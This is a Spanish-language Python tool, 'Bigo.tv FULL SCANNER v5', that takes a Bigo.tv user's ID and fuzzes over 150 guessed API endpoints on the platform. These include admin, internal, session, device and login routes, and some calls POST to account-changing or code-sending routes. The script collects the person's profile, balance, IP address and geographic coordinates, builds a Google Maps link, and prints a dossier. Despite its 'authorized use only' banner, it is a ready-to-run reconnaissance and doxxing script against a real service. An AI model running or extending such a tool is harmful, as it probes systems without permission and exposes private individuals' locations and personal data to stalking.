#!/usr/bin/env python3
"""
Bigo.tv FULL SCANNER v5 - Todos los endpoints posibles
Escaneo masivo con +150 endpoints para extraer TODO
USO AUTORIZADO SOLAMENTE - Pentesting ético
"""

import requests
import json
import sys
import re
import time
import hashlib
from urllib.parse import urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


class BigoFullScannerV5:
    def __init__(self, verbose=True):
        self.base_url = "https://www.bigo.tv"
        self.api_url = "https://ta.bigo.tv/official_website"
        self.login_url = "https://ta.bigo.tv/official_website_login"
        self.cpp_url = "https://https-api.bigolive.tv"
        self.bigodiamond_url = "https://bigodiamond.com"
        self.verbose = verbose
        self.user_id = None
        
        # Session principal
        self.s = requests.Session()
        self.s.timeout = 15
        self.s.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.base_url,
            "Referer": self.base_url + "/",
            "DNT": "1",
            "Connection": "keep-alive",
        })
        
        # Session HTML
        self.html_s = requests.Session()
        self.html_s.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        
        self.result = {
            "scan_time": datetime.now().isoformat(),
            "user_id": None,
            "usuario": {
                "id": None,
                "bigo_id": None,
                "nickname": None,
                "avatar": None,
                "avatar_grande": None,
                "nivel": 0,
                "nivel_icono": None,
                "genero": None,
                "edad": None,
                "pais": None,
                "pais_codigo": None,
                "ciudad": None,
                "seguidores": 0,
                "siguiendo": 0,
                "biografia": None,
                "verificado": False,
                "mystery_mode": False,
                "balance": 0,
                "fecha_registro": None,
                "ultima_conexion": None,
                "online_status": None,
                "telefono": None,
                "email": None,
                "instagram": None,
                "twitter": None,
                "facebook": None,
                "youtube": None,
                "tiktok": None,
                "twitch": None,
            },
            "stream": {
                "activo": False,
                "room_id": None,
                "room_type": None,
                "titulo": None,
                "juego": None,
                "juego_id": None,
                "categoria": None,
                "espectadores": 0,
                "hls_url": None,
                "flv_url": None,
                "thumbnail": None,
                "start_time": None,
                "duracion": None,
                "streamer_id": None,
                "alive": 0,
                "push_url": None,
            },
            "estadisticas": {
                "vistas_totales": 0,
                "total_likes": 0,
                "total_diamantes": 0,
                "total_gifts": 0,
                "rango_semanal": None,
                "rango_mensual": None,
                "recepcion_gifts": 0,
                "envio_gifts": 0,
            },
            "juegos": [],
            "endpoints": {
                "encontrados": [],
                "totales": 0,
                "exitosos": 0,
            },
            "ubicacion": {},
            "redes": {},
            "enlaces": {}
        }
        
        # Cache de datos extraídos
        self._extracted_data = {}
    
    def log(self, msg, end="\n", level="INFO"):
        if self.verbose:
            prefix = {
                "INFO": "  ",
                "OK": "  ✓",
                "WARN": "  ⚠️",
                "ERROR": "  ✗",
                "STREAM": "  🔴",
                "USER": "  👤",
                "MAP": "  🗺️",
                "GAME": "  🎮",
            }.get(level, "  ")
            print(f"{prefix} {msg}", end=end)
    
    def _extract_user_fields(self, data, source="unknown"):
        """Extrae campos de usuario de cualquier diccionario"""
        if not isinstance(data, dict):
            return
        
        mapping = {
            'nick_name': 'nickname', 'nickname': 'nickname', 
            'userName': 'nickname', 'name': 'nickname',
            'data5': 'avatar', 'headPic': 'avatar', 'avatar': 'avatar',
            'head_photo': 'avatar', 'photo': 'avatar',
            'level': 'nivel', 'userLevel': 'nivel', 'levelId': 'nivel',
            'country': 'pais', 'nation': 'pais', 'region': 'pais',
            'city': 'ciudad', 'town': 'ciudad',
            'followers': 'seguidores', 'followerNum': 'seguidores', 
            'fansNum': 'seguidores', 'fans': 'seguidores',
            'followings': 'siguiendo', 'followNum': 'siguiendo',
            'attentionNum': 'siguiendo', 'following': 'siguiendo',
            'introduction': 'biografia', 'bio': 'biografia',
            'desc': 'biografia', 'description': 'biografia',
            'sign': 'biografia', 'about': 'biografia',
            'age': 'edad', 'birthday': 'edad',
            'clientBigoId': 'bigo_id', 'bigoId': 'bigo_id',
            'userId': 'bigo_id', 'uid': 'bigo_id',
            'six': 'genero', 'gender': 'genero', 'sex': 'genero',
            'balance': 'balance', 'diamond': 'balance', 'coin': 'balance',
            'reg_time': 'fecha_registro', 'registerTime': 'fecha_registro',
            'createTime': 'fecha_registro', 'regTime': 'fecha_registro',
            'lastActive': 'ultima_conexion', 'lastLoginTime': 'ultima_conexion',
            'onlineStatus': 'online_status', 'isOnline': 'online_status',
            'mystery': 'mystery_mode', 'secretMode': 'mystery_mode',
            'levelIcon': 'nivel_icono', 'levelImg': 'nivel_icono',
            'verified': 'verificado', 'isVerified': 'verificado',
            'followers_count': 'seguidores', 'following_count': 'siguiendo',
            'instagram': 'instagram', 'twitter': 'twitter',
            'facebook': 'facebook', 'youtube': 'youtube',
            'tiktok': 'tiktok', 'twitch': 'twitch',
            'phone': 'telefono', 'mobile': 'telefono',
            'email': 'email', 'mail': 'email',
        }
        
        for src, dst in mapping.items():
            val = data.get(src)
            if val is not None:
                # Convertir tipos
                if dst in ['seguidores', 'siguiendo', 'edad', 'balance', 'nivel']:
                    try: val = int(val)
                    except: pass
                if dst == 'verificado':
                    val = bool(val) and val != 0
                if dst == 'mystery_mode':
                    val = val == 1 or val is True
                if dst == 'genero':
                    if val in [1, '1', 'male', 'Masculino']:
                        val = "Masculino"
                    elif val in [2, '2', 'female', 'Femenino']:
                        val = "Femenino"
                
                # Solo asignar si no existe o es mejor
                if self.result["usuario"][dst] in [None, 0, ""]:
                    self.result["usuario"][dst] = val
        
        # Extraer estadísticas adicionales
        stats_map = {
            'totalViews': 'vistas_totales',
            'views': 'vistas_totales',
            'watchNum': 'vistas_totales',
            'totalLikes': 'total_likes',
            'likes': 'total_likes',
            'likeNum': 'total_likes',
            'totalDiamonds': 'total_diamantes',
            'diamonds': 'total_diamantes',
            'diamondNum': 'total_diamantes',
            'giftTotal': 'total_gifts',
            'totalGifts': 'total_gifts',
            'giftNum': 'total_gifts',
            'receiveGifts': 'recepcion_gifts',
            'sendGifts': 'envio_gifts',
        }
        for src, dst in stats_map.items():
            val = data.get(src)
            if val is not None:
                try: val = int(val)
                except: pass
                if self.result["estadisticas"][dst] == 0:
                    self.result["estadisticas"][dst] = val

    # ============================================================
    # ENDPOINTS - Lista completa de endpoints a probar
    # ============================================================
    
    def _get_all_endpoints(self, user_id):
        """Genera todos los endpoints a probar"""
        endpoints = []
        
        # 1. Perfil / Usuario
        profile_endpoints = [
            ("user/profile", "GET", {"userId": user_id}),
            ("user/detail", "GET", {"uid": user_id}),
            ("user/info", "GET", {"userId": user_id}),
            ("user/search", "GET", {"keyword": user_id}),
            ("user/list", "GET", {}),
            ("user/status", "GET", {"userId": user_id}),
            ("user/followers", "GET", {"userId": user_id}),
            ("user/following", "GET", {"userId": user_id}),
            ("user/friends", "GET", {"userId": user_id}),
            ("user/blocked", "GET", {"userId": user_id}),
            ("user/settings", "GET", {"userId": user_id}),
            ("user/privacy", "GET", {"userId": user_id}),
            ("user/verify", "GET", {"userId": user_id}),
            ("user/badge", "GET", {"userId": user_id}),
            ("user/level", "GET", {"userId": user_id}),
            ("user/points", "GET", {"userId": user_id}),
            ("user/diamonds", "GET", {"userId": user_id}),
            ("user/gifts", "GET", {"userId": user_id}),
            ("user/history", "GET", {"userId": user_id}),
            ("user/activity", "GET", {"userId": user_id}),
            ("user/login_history", "GET", {"userId": user_id}),
            ("user/device", "GET", {"userId": user_id}),
            ("user/sessions", "GET", {"userId": user_id}),
            ("user/region", "GET", {"userId": user_id}),
            ("user/timezone", "GET", {"userId": user_id}),
            ("user/location", "GET", {"userId": user_id}),
            ("user/geo", "GET", {"userId": user_id}),
            ("user/address", "GET", {"userId": user_id}),
            ("user/phone", "GET", {"userId": user_id}),
            ("user/email", "GET", {"userId": user_id}),
            ("user/social", "GET", {"userId": user_id}),
            ("user/links", "GET", {"userId": user_id}),
            ("user/stats", "GET", {"userId": user_id}),
            ("user/statistics", "GET", {"userId": user_id}),
        ]
        endpoints.extend(profile_endpoints)
        
        # 2. Studio / Stream
        studio_endpoints = [
            ("studio/info", "GET", {"siteId": user_id}),
            ("studio/getInternalStudioInfo", "POST", {"siteId": user_id}),
            ("studio/getStudioInfo", "GET", {"siteId": user_id}),
            ("studio/list", "GET", {}),
            ("studio/search", "GET", {"siteId": user_id}),
            ("studio/active", "GET", {"siteId": user_id}),
            ("studio/recent", "GET", {"siteId": user_id}),
            ("studio/recordings", "GET", {"siteId": user_id}),
            ("studio/stats", "GET", {"siteId": user_id}),
            ("studio/analytics", "GET", {"siteId": user_id}),
            ("studio/viewers", "GET", {"siteId": user_id}),
            ("studio/chat", "GET", {"siteId": user_id}),
            ("studio/getWebSocketLink", "POST", {"roomId": user_id}),
            ("studio/status", "GET", {"siteId": user_id}),
        ]
        endpoints.extend(studio_endpoints)
        
        # 3. UserCenter
        usercenter_endpoints = [
            ("usercenter/getUserInfo", "GET", {"userId": user_id}),
            ("usercenter/uUserInfo", "POST", {"userId": user_id}),
            ("usercenter/uAvatar", "POST", {"userId": user_id}),
            ("usercenter/getReEntrance", "POST", {"lang": "en"}),
            ("usercenter/queryCountry", "POST", {}),
        ]
        endpoints.extend(usercenter_endpoints)
        
        # 4. OInterface
        ointerface_endpoints = [
            ("OInterface/getCountryInfoList", "GET", {}),
            ("OInterface/getRegionList", "GET", {"userId": user_id}),
            ("OInterface/getGameCategory", "GET", {}),
            ("OInterface/getGameMap", "GET", {}),
            ("OInterface/getAd", "GET", {"userId": user_id}),
            ("OInterface/getWeekGetRank", "GET", {}),
            ("OInterface/getWeekSendRank", "GET", {}),
        ]
        endpoints.extend(ointerface_endpoints)
        
        # 5. OInterfaceWeb
        ointerfaceweb_endpoints = [
            ("OInterfaceWeb/vedioList/5", "GET", {"uid": user_id}),
            ("OInterfaceWeb/vedioList/11", "GET", {"uid": user_id}),
            ("OInterfaceWeb/vedioList/72", "GET", {"uid": user_id}),
        ]
        endpoints.extend(ointerfaceweb_endpoints)
        
        # 6. OUserCenter
        ousercenter_endpoints = [
            ("OUserCenter/getUserInfoStudio", "GET", {"userId": user_id}),
            ("OUserCenter/getUserInfoStudio", "GET", {"siteId": user_id}),
        ]
        endpoints.extend(ousercenter_endpoints)
        
        # 7. Auth
        auth_endpoints = [
            ("auth/user", "GET", {"userId": user_id}),
            ("auth/profile", "GET", {"userId": user_id}),
            ("auth/me", "GET", {}),
            ("auth/check", "GET", {"userId": user_id}),
            ("auth/status", "GET", {"userId": user_id}),
            ("auth/session", "GET", {"userId": user_id}),
        ]
        endpoints.extend(auth_endpoints)
        
        # 8. Admin / Internal
        admin_endpoints = [
            ("admin/users", "GET", {}),
            ("admin/user/list", "GET", {}),
            ("admin/user/info", "GET", {"userId": user_id}),
            ("admin/user/search", "GET", {"keyword": user_id}),
            ("admin/user/profile", "GET", {"userId": user_id}),
            ("internal/user/list", "GET", {}),
            ("internal/user/info", "GET", {"userId": user_id}),
            ("internal/user/profile", "GET", {"userId": user_id}),
            ("internal/studio/list", "GET", {}),
            ("internal/studio/info", "GET", {"siteId": user_id}),
        ]
        endpoints.extend(admin_endpoints)
        
        # 9. API v1/v2
        api_endpoints = [
            ("api/user/profile", "GET", {"userId": user_id}),
            ("api/user/info", "GET", {"userId": user_id}),
            ("api/user/detail", "GET", {"userId": user_id}),
            ("api/studio/info", "GET", {"siteId": user_id}),
            ("v1/user/profile", "GET", {"userId": user_id}),
            ("v1/user/info", "GET", {"userId": user_id}),
            ("v1/user/detail", "GET", {"userId": user_id}),
            ("v1/studio/info", "GET", {"siteId": user_id}),
            ("v2/user/profile", "GET", {"userId": user_id}),
            ("v2/user/info", "GET", {"userId": user_id}),
            ("v2/user/detail", "GET", {"userId": user_id}),
            ("v2/user/region", "GET", {"userId": user_id}),
            ("v2/user/location", "GET", {"userId": user_id}),
        ]
        endpoints.extend(api_endpoints)
        
        # 10. Live / Gifts
        live_endpoints = [
            ("live/giftconfig/getOnlineGifts", "GET", {"userId": user_id}),
            ("gift/list", "GET", {}),
            ("gift/info", "GET", {"userId": user_id}),
            ("gift/user", "GET", {"userId": user_id}),
        ]
        endpoints.extend(live_endpoints)
        
        # 11. Config / System
        config_endpoints = [
            ("config", "GET", {}),
            ("config/user", "GET", {"userId": user_id}),
            ("config/profile", "GET", {"userId": user_id}),
            ("system/info", "GET", {}),
            ("system/status", "GET", {}),
            ("health", "GET", {}),
            ("version", "GET", {}),
            ("status", "GET", {}),
        ]
        endpoints.extend(config_endpoints)
        
        # 12. Search / Follow / Notification
        other_endpoints = [
            ("search", "GET", {"q": user_id}),
            ("search/user", "GET", {"q": user_id}),
            ("search/studio", "GET", {"q": user_id}),
            ("follow", "GET", {"userId": user_id}),
            ("follow/list", "GET", {"userId": user_id}),
            ("notification/list", "GET", {"userId": user_id}),
            ("notification/settings", "GET", {"userId": user_id}),
            ("report/user", "GET", {"userId": user_id}),
            ("report/studio", "GET", {"siteId": user_id}),
            ("download/queryForbid", "GET", {}),
            ("device/qryInfo", "POST", {}),
        ]
        endpoints.extend(other_endpoints)
        
        # 13. Login endpoints
        login_endpoints = [
            ("login", "POST", {"userId": user_id}),
            ("logout", "POST", {"userId": user_id}),
            ("checkCode", "POST", {"phone": user_id}),
            ("sendCode", "POST", {"phone": user_id}),
            ("register", "POST", {"phone": user_id}),
        ]
        endpoints.extend(login_endpoints)
        
        return endpoints
    
    # ============================================================
    # EJECUTAR TODOS LOS ENDPOINTS
    # ============================================================
    
    def _probe_endpoint(self, endpoint, user_id):
        """Prueba un endpoint individual"""
        path, method, params = endpoint
        urls = []
        
        # Probar en diferentes bases
        bases = [
            self.api_url,
            self.login_url,
            self.base_url,
            self.cpp_url,
        ]
        
        for base in bases[:2]:  # Principalmente API y Login
            url = f"{base}/{path}"
            urls.append((url, base))
        
        results = []
        for url, base in urls:
            try:
                if method == "GET":
                    resp = self.s.get(url, params=params, timeout=8)
                else:
                    resp = self.s.post(url, data=params, timeout=8)
                
                if resp.status_code not in [404, 405, 429, 503, 410, 403]:
                    try:
                        json_data = resp.json()
                        data_type = "json"
                    except:
                        json_data = None
                        data_type = "text"
                    
                    results.append({
                        "url": url,
                        "method": method,
                        "status": resp.status_code,
                        "data": json_data,
                        "text_preview": resp.text[:200] if not json_data else "",
                        "data_type": data_type,
                    })
                    
                    # Extraer datos si es JSON
                    if json_data and isinstance(json_data, dict):
                        self._extract_user_fields(json_data)
                        if "data" in json_data and isinstance(json_data["data"], dict):
                            self._extract_user_fields(json_data["data"])
            except:
                pass
        
        return results
    
    def _fuzz_all_endpoints(self, user_id):
        """Fuzz todos los endpoints"""
        self.log("\n  [F] Probando endpoints...", level="INFO")
        endpoints = self._get_all_endpoints(user_id)
        total = len(endpoints)
        self.log(f"Total: {total} endpoints", level="INFO")
        
        encontrados = []
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(self._probe_endpoint, ep, user_id): ep for ep in endpoints}
            for i, future in enumerate(as_completed(futures)):
                ep = futures[future]
                try:
                    results = future.result()
                    for r in results:
                        if r:
                            encontrados.append(r)
                            self.log(f"✓ [{r['status']}] {r['method']} {r['url'][:60]}...", level="OK")
                            
                            if r.get("data") and isinstance(r["data"], dict):
                                if "data" in r["data"]:
                                    preview = str(r["data"]["data"])[:100]
                                else:
                                    preview = str(r["data"])[:100]
                                self.log(f"  Datos: {preview}", level="INFO")
                except:
                    pass
                
                # Progreso
                if (i + 1) % 10 == 0:
                    self.log(f"  Progreso: {i+1}/{total}", level="INFO")
        
        self.result["endpoints"]["encontrados"] = encontrados
        self.result["endpoints"]["totales"] = total
        self.result["endpoints"]["exitosos"] = len(encontrados)
        return encontrados
    
    # ============================================================
    # ENDPOINTS ESPECÍFICOS (los más importantes)
    # ============================================================
    
    def _endpoint_studio_info(self, user_id):
        """POST a getInternalStudioInfo"""
        self.log("\n[1] getInternalStudioInfo (POST)", level="STREAM")
        url = f"{self.api_url}/studio/getInternalStudioInfo"
        
        try:
            resp = self.s.post(url, data={"siteId": user_id})
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0 and data.get("data"):
                    d = data["data"]
                    self.log(f"Room ID: {d.get('roomId')}", level="OK")
                    self.log(f"Título: {d.get('roomTopic')}", level="OK")
                    self.log(f"Juego: {d.get('gameTitle')}", level="OK")
                    self.log(f"Nickname: {d.get('nick_name')}", level="OK")
                    self.log(f"Alive: {d.get('alive')}", level="OK")
                    
                    self.result["stream"]["room_id"] = d.get('roomId')
                    self.result["stream"]["room_type"] = d.get('roomType')
                    self.result["stream"]["titulo"] = d.get('roomTopic')
                    self.result["stream"]["juego"] = d.get('gameTitle')
                    self.result["stream"]["juego_id"] = d.get('gameId')
                    self.result["stream"]["espectadores"] = d.get('viewers') or 0
                    self.result["stream"]["thumbnail"] = d.get('snapshot')
                    self.result["stream"]["start_time"] = d.get('startTime')
                    self.result["stream"]["duracion"] = d.get('liveDuration')
                    self.result["stream"]["alive"] = d.get('alive')
                    self.result["stream"]["streamer_id"] = d.get('streamerId')
                    self.result["stream"]["push_url"] = d.get('push_url')
                    
                    if d.get('alive'):
                        self.result["stream"]["activo"] = True
                        self.result["stream"]["hls_url"] = d.get('hls_src')
                        self.log(f"🔴 HLS: {d.get('hls_src')}", level="STREAM")
                    
                    if d.get('nick_name'):
                        self.result["usuario"]["nickname"] = d['nick_name']
                    if d.get('clientBigoId'):
                        self.result["usuario"]["bigo_id"] = d['clientBigoId']
                    if d.get('country'):
                        self.result["usuario"]["pais"] = d['country']
                    if d.get('city'):
                        self.result["usuario"]["ciudad"] = d['city']
                    
                    self._extract_user_fields(d)
                    return data
                else:
                    self.log(f"Código: {data.get('code')} - {data.get('msg')}", level="WARN")
            else:
                self.log(f"Status: {resp.status_code}", level="ERROR")
        except Exception as e:
            self.log(f"Error: {e}", level="ERROR")
        return None
    
    def _endpoint_user_info(self, user_id):
        """GET a getUserInfo - ENDPOINT CLAVE"""
        self.log("\n[2] getUserInfo (GET)", level="USER")
        url = f"{self.api_url}/usercenter/getUserInfo"
        
        try:
            resp = self.s.get(url, params={"userId": user_id})
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data and isinstance(data, dict):
                        if data.get("code") == 0 and data.get("data"):
                            self._extract_user_fields(data["data"])
                            d = data["data"]
                            self.log(f"Nickname: {d.get('nick_name')}", level="OK")
                            self.log(f"Nivel: {d.get('level')}", level="OK")
                            self.log(f"País: {d.get('country')}", level="OK")
                            self.log(f"Ciudad: {d.get('city')}", level="OK")
                            self.log(f"Seguidores: {d.get('followers')}", level="OK")
                            self.log(f"Balance: {d.get('balance')}", level="OK")
                            self.log(f"BIGO ID: {d.get('clientBigoId')}", level="OK")
                            return data
                except:
                    pass
        except:
            pass
        return None
    
    def _endpoint_user_studio(self, user_id):
        """GET a OUserCenter/getUserInfoStudio - UBICACIÓN"""
        self.log("\n[3] OUserCenter/getUserInfoStudio (GET)", level="MAP")
        url = f"{self.api_url}/OUserCenter/getUserInfoStudio"
        
        for param_name in ["userId", "siteId"]:
            try:
                resp = self.s.get(url, params={param_name: user_id})
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get("code") == 0 and data.get("data"):
                            d = data["data"]
                            self.log(f"País: {d.get('country')}", level="OK")
                            self.log(f"Ciudad: {d.get('city')}", level="OK")
                            self.log(f"IP: {d.get('ip')}", level="OK")
                            if d.get('latitude') and d.get('longitude'):
                                self.log(f"Coordenadas: {d.get('latitude')}, {d.get('longitude')}", level="OK")
                                self.log(f"🗺️ https://www.google.com/maps?q={d.get('latitude')},{d.get('longitude')}", level="MAP")
                                self.result["ubicacion"]["lat"] = d.get('latitude')
                                self.result["ubicacion"]["lon"] = d.get('longitude')
                            if d.get('timezone'):
                                self.log(f"Zona Horaria: {d.get('timezone')}", level="OK")
                            
                            self.result["ubicacion"]["ip"] = d.get('ip')
                            self.result["ubicacion"]["timezone"] = d.get('timezone')
                            if d.get('country'):
                                self.result["usuario"]["pais"] = d['country']
                            if d.get('city'):
                                self.result["usuario"]["ciudad"] = d['city']
                            return data
                    except:
                        pass
            except:
                pass
        return None
    
    def _endpoint_games(self):
        """GET a getGameCategory"""
        self.log("\n[4] Juegos y categorías (GET)", level="GAME")
        url = f"{self.api_url}/OInterface/getGameCategory"
        
        try:
            resp = self.s.get(url)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and len(data) > 0:
                    self.result["juegos"] = []
                    for g in data[:15]:
                        nombre = g.get('title') or g.get('name') or g.get('gameTitle')
                        if nombre:
                            self.result["juegos"].append({
                                "id": g.get('tabId') or g.get('id'),
                                "nombre": nombre,
                                "icono": g.get('icon'),
                            })
                    self.log(f"{len(data)} categorías encontradas", level="OK")
                    for g in self.result["juegos"][:5]:
                        self.log(f"  • {g['nombre']}", level="INFO")
                    return data
        except:
            pass
        return None
    
    def _endpoint_websocket(self, user_id):
        """POST a getWebSocketLink"""
        self.log("\n[5] WebSocket Link (POST)", level="STREAM")
        url = f"{self.api_url}/studio/getWebSocketLink"
        
        try:
            resp = self.s.post(url, json={"roomId": user_id})
            if resp.status_code == 200:
                data = resp.json()
                if data.get("code") == 0 and data.get("data"):
                    ws_url = data["data"].get("wsUrl")
                    if ws_url:
                        self.log(f"WebSocket: {ws_url[:80]}...", level="OK")
                        self.result["stream"]["ws_url"] = ws_url
                        return data
        except:
            pass
        return None
    
    def _endpoint_html_profile(self, user_id):
        """Extrae del HTML de bigo.tv/user/{id}"""
        self.log("\n[6] Perfil HTML (mobile)", level="INFO")
        url = f"{self.base_url}/user/{user_id}"
        
        try:
            resp = self.html_s.get(url)
            if resp.status_code == 200:
                html = resp.text
                
                # Buscar window.__BIGOLIVE__
                json_match = re.search(r'window\.__BIGOLIVE__\s*=\s*({.*?});', html, re.DOTALL)
                if json_match:
                    try:
                        data = json.loads(json_match.group(1))
                        state = data.get('state', {})
                        user_info = state.get('userInfo', {})
                        if user_info:
                            self._extract_user_fields(user_info)
                            self.log(f"Nickname: {user_info.get('nick_name')}", level="OK")
                            self.log(f"Nivel: {user_info.get('level')}", level="OK")
                            self.log(f"Seguidores: {user_info.get('followers')}", level="OK")
                    except:
                        pass
                
                # Buscar metadatos
                og_image = re.search(r'<meta\s+property=["\']og:image["\']\s+content=["\']([^"\']+)["\']', html, re.I)
                if og_image:
                    self.result["usuario"]["avatar_grande"] = og_image.group(1)
                    if not self.result["usuario"]["avatar"]:
                        self.result["usuario"]["avatar"] = og_image.group(1)
                
                self.log("HTML parseado correctamente", level="OK")
        except Exception as e:
            self.log(f"Error: {e}", level="ERROR")
    
    # ============================================================
    # SCAN COMPLETO
    # ============================================================
    
    def scan_user(self, user_id):
        """Ejecuta todas las fases"""
        user_id = str(user_id)
        self.user_id = user_id
        self.result["user_id"] = user_id
        self.result["usuario"]["id"] = user_id
        
        print("\n" + "=" * 70)
        print(f"  📱 BIGO.TV FULL SCANNER v5 - Usuario: {user_id}")
        print("=" * 70)
        print(f"  Iniciando escaneo con {len(self._get_all_endpoints(user_id))} endpoints...")
        print("=" * 70)
        
        # Fases principales
        self._endpoint_studio_info(user_id)
        self._endpoint_user_info(user_id)
        self._endpoint_user_studio(user_id)
        self._endpoint_games()
        self._endpoint_websocket(user_id)
        self._endpoint_html_profile(user_id)
        
        # Fuzzing masivo
        self._fuzz_all_endpoints(user_id)
        
        # Generar enlaces
        self._generate_links(user_id)
        
        # Resumen
        self._print_summary()
        
        return self.result
    
    def _generate_links(self, user_id):
        self.result["enlaces"]["perfil"] = f"{self.base_url}/{user_id}"
        self.result["enlaces"]["perfil_mobile"] = f"{self.base_url}/user/{user_id}"
        self.result["enlaces"]["app_deeplink"] = f"bigolive://profile?uid={user_id}"
        self.result["enlaces"]["compartir"] = f"https://bigo.onelink.me/1168916328?pid=website&c=profile&is_retargeting=true&af_dp=bigolive%3A%2F%2Fprofile%3Fuid%3D{user_id}&af_web_dp=https%3A%2F%2Fwww.bigo.tv%2Fuser%2F{user_id}"
    
    # ============================================================
    # RESUMEN
    # ============================================================
    
    def _print_summary(self):
        print("\n" + "=" * 70)
        print("  📋 RESUMEN COMPLETO DE PERFIL")
        print("=" * 70)
        
        u = self.result["usuario"]
        s = self.result["stream"]
        e = self.result["enlaces"]
        ep = self.result["endpoints"]["encontrados"]
        
        def fmt(n):
            if n is None: return "N/A"
            if isinstance(n, int) and n > 0: return f"{n:,}"
            if n == "": return "N/A"
            return str(n)
        
        # Usuario
        print("\n  👤 USUARIO:")
        print(f"    ┌{'─'*60}┐")
        print(f"    │ ID              : {u['id']}")
        print(f"    │ BIGO ID         : {fmt(u['bigo_id'])}")
        print(f"    │ Nickname        : {fmt(u['nickname'])}")
        print(f"    │ Nivel           : {fmt(u['nivel'])}")
        print(f"    │ Género          : {fmt(u['genero'])}")
        print(f"    │ Edad            : {fmt(u['edad'])}")
        print(f"    │ País            : {fmt(u['pais'])}")
        if u.get('pais_codigo'):
            print(f"    │ Código País     : {u['pais_codigo']}")
        print(f"    │ Ciudad          : {fmt(u['ciudad'])}")
        print(f"    │ Seguidores      : {fmt(u['seguidores'])}")
        print(f"    │ Siguiendo       : {fmt(u['siguiendo'])}")
        print(f"    │ Balance         : {fmt(u['balance'])}")
        print(f"    │ Verificado      : {'✅ Sí' if u['verificado'] else '❌ No'}")
        print(f"    │ Modo Misterio   : {'🔮 Sí' if u['mystery_mode'] else '❌ No'}")
        print(f"    │ Registro        : {fmt(u['fecha_registro'])}")
        print(f"    │ Última Conexión : {fmt(u['ultima_conexion'])}")
        print(f"    │ Estado Online   : {fmt(u['online_status'])}")
        if u.get('biografia'):
            bio = u['biografia'][:55] + '...' if len(u['biografia']) > 55 else u['biografia']
            print(f"    │ Biografía       : {bio}")
        print(f"    └{'─'*60}┘")
        
        # Stream
        print("\n  📡 STREAM:")
        print(f"    ┌{'─'*60}┐")
        estado = '🔴 EN VIVO' if s['activo'] else '⚫ OFFLINE'
        print(f"    │ Estado          : {estado}")
        print(f"    │ Room ID         : {fmt(s['room_id'])}")
        print(f"    │ Tipo            : {fmt(s['room_type'])}")
        print(f"    │ Título          : {fmt(s['titulo'])}")
        print(f"    │ Juego           : {fmt(s['juego'])}")
        print(f"    │ Categoría       : {fmt(s['categoria'])}")
        print(f"    │ Espectadores    : {fmt(s['espectadores'])}")
        if s.get('duracion'):
            print(f"    │ Duración        : {s['duracion']}s")
        if s.get('hls_url'):
            print(f"    │ HLS URL         : {s['hls_url'][:70]}...")
        if s.get('ws_url'):
            print(f"    │ WebSocket       : {s['ws_url'][:70]}...")
        print(f"    └{'─'*60}┘")
        
        # Estadísticas
        print("\n  📊 ESTADÍSTICAS:")
        print(f"    ┌{'─'*60}┐")
        print(f"    │ Vistas totales  : {fmt(self.result['estadisticas']['vistas_totales'])}")
        print(f"    │ Total Likes     : {fmt(self.result['estadisticas']['total_likes'])}")
        print(f"    │ Diamantes       : {fmt(self.result['estadisticas']['total_diamantes'])}")
        print(f"    │ Total Gifts     : {fmt(self.result['estadisticas']['total_gifts'])}")
        print(f"    └{'─'*60}┘")
        
        # Juegos
        if self.result["juegos"]:
            print(f"\n  🎮 JUEGOS ({len(self.result['juegos'])} categorías):")
            print(f"    ┌{'─'*60}┐")
            for g in self.result["juegos"][:8]:
                nombre = g.get('nombre', 'N/A')
                if nombre and nombre != 'N/A':
                    print(f"    │ • {nombre}")
            print(f"    └{'─'*60}┘")
        
        # Ubicación
        if self.result["ubicacion"]:
            print(f"\n  📍 UBICACIÓN:")
            print(f"    ┌{'─'*60}┐")
            loc = self.result["ubicacion"]
            if loc.get('ip'):
                print(f"    │ IP              : {loc['ip']}")
            if loc.get('lat') and loc.get('lon'):
                print(f"    │ Coordenadas     : {loc['lat']}, {loc['lon']}")
                print(f"    │ Google Maps     : https://www.google.com/maps?q={loc['lat']},{loc['lon']}")
            if loc.get('timezone'):
                print(f"    │ Zona Horaria    : {loc['timezone']}")
            print(f"    └{'─'*60}┘")
        
        # Endpoints
        print(f"\n  🔗 ENDPOINTS ENCONTRADOS: {len(ep)} de {self.result['endpoints']['totales']}")
        for ep_item in ep[:12]:
            status = ep_item['status']
            method = ep_item['method']
            url = ep_item['url'][:60]
            print(f"    [{status}] {method} {url}...")
        if len(ep) > 12:
            print(f"    ... y {len(ep)-12} más")
        
        # Enlaces
        print(f"\n  🔗 ENLACES:")
        print(f"    ┌{'─'*60}┐")
        print(f"    │ Perfil          : {e['perfil']}")
        print(f"    │ Perfil móvil    : {e['perfil_mobile']}")
        print(f"    │ Deeplink        : {e['app_deeplink']}")
        print(f"    └{'─'*60}┘")
        
        if u['avatar']:
            print(f"\n  🖼️  AVATAR: {u['avatar']}")
        
        print("\n" + "=" * 70)
        print(f"  ✅ ESCANEO COMPLETADO - {self.result['endpoints']['exitosos']} endpoints encontrados")
        print("=" * 70)


def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║           BIGO.TV FULL SCANNER v5 - 150+ Endpoints              ║
║              Escaneo masivo de TODOS los endpoints              ║
║                  USO AUTORIZADO SOLAMENTE                        ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        user_id = sys.argv[1]
    else:
        user_id = input("  Ingrese el BIGO ID del usuario (ej: 1069633291): ").strip()
    
    if not user_id or not user_id.isdigit():
        print("\n  ❌ Error: El ID debe ser un número.")
        sys.exit(1)
    
    scanner = BigoFullScannerV5(verbose=True)
    result = scanner.scan_user(user_id)
    
